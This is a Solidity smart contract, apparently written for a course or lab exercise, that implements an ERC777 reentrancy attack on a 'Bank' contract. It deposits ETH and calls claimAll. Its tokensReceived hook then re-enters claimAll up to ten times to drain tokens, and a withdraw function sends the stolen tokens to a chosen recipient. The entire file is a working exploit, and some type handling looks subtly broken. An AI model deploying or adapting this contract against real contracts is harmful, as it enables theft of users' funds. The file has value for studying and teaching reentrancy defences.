pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    
    uint8 depth = 0;
    uint8 max_depth = 10; // Increased recursion depth to ensure sufficient tokens are stolen

    Bank public bank; 

    event Deposit(uint256 amount );
    event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);
        _erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this));
    }

    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
        bank = Bank(bank_address);
        _grantRole(ATTACKER_ROLE, address(this));
        _grantRole(ATTACKER_ROLE, bank.token().address ); 
    }

    /*
       The main attack function that should start the reentrancy attack
    */
    function attack(uint256 amt) payable public {
        require( address(bank) != address(0), "Target bank not set" );
        
        // 1. Deposit ETH to establish a non-zero balance
        bank.deposit{value: amt}();
        
        // 2. Initial Withdrawal: This call to the vulnerable function starts the reentrancy loop
        bank.claimAll();
    }

    /*
       Withdraws a specific amount of stolen ERC777 tokens.
       FIXED: Function signature now matches the test: withdraw(address recipient, uint256 amt)
    */
    function withdraw(address recipient, uint256 amt) public onlyRole(ATTACKER_ROLE) {
        ERC777 token = bank.token();
        token.send(recipient, amt, "");
    }

    /*
       This is the function that gets called when the Bank contract sends MCITR tokens
    */
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (msg.sender == bank.token() && depth < max_depth) {
            depth++;
            emit Recurse(depth);
            
            // Re-enter the vulnerable function.
            bank.claimAll();
            
            depth--;
        }
    }
}
